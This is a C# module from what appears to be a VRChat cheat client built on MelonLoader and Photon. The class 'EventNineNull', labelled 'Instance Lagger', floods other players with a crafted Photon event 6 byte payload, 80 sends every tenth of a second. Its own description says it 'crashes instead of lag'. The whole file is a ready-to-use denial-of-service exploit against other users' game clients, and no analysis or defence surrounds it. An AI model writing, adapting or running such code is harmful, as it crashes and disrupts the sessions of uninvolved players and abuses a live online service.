using System.Collections;
using Area51.SDK.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;

namespace Area51.Module.Exploit
{
	internal class EventNineNull : BaseModule
	{
		public readonly byte[] E6Bytes = new byte[52]
		{
			106, 191, 218, 132, 88, 12, 0, 0, 0, 7,
			0, 58, 118, 213, 255, 255, 50, 47, 14, 0,
			255, 0, 0, 0, 0, 9, 0, 0, 0, 13,
			0, 69, 110, 97, 98, 108, 101, 77, 101, 115,
			104, 82, 80, 67, 0, 0, 0, 0, 0, 0,
			0, 2
		};

		public EventNineNull()
			: base("Instance\nLagger", "Best Event 6 Exploit & Crashes Instead Of lag", Main.Instance.Eventexploitbutton, null, isToggle: true)
		{
		}

		public override void OnEnable()
		{
			MelonCoroutines.Start(Event6());
		}

		private IEnumerator Event6()
		{
			while (toggled)
			{
				for (int i = 0; i < 80; i++)
				{
					PhotonExtensions.OpRaiseEvent(6, E6Bytes, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
						field_Public_EventCaching_0 = EventCaching.DoNotCache
					}, default(SendOptions));
				}
				yield return new WaitForSecondsRealtime(0.1f);
			}
		}
	}
}
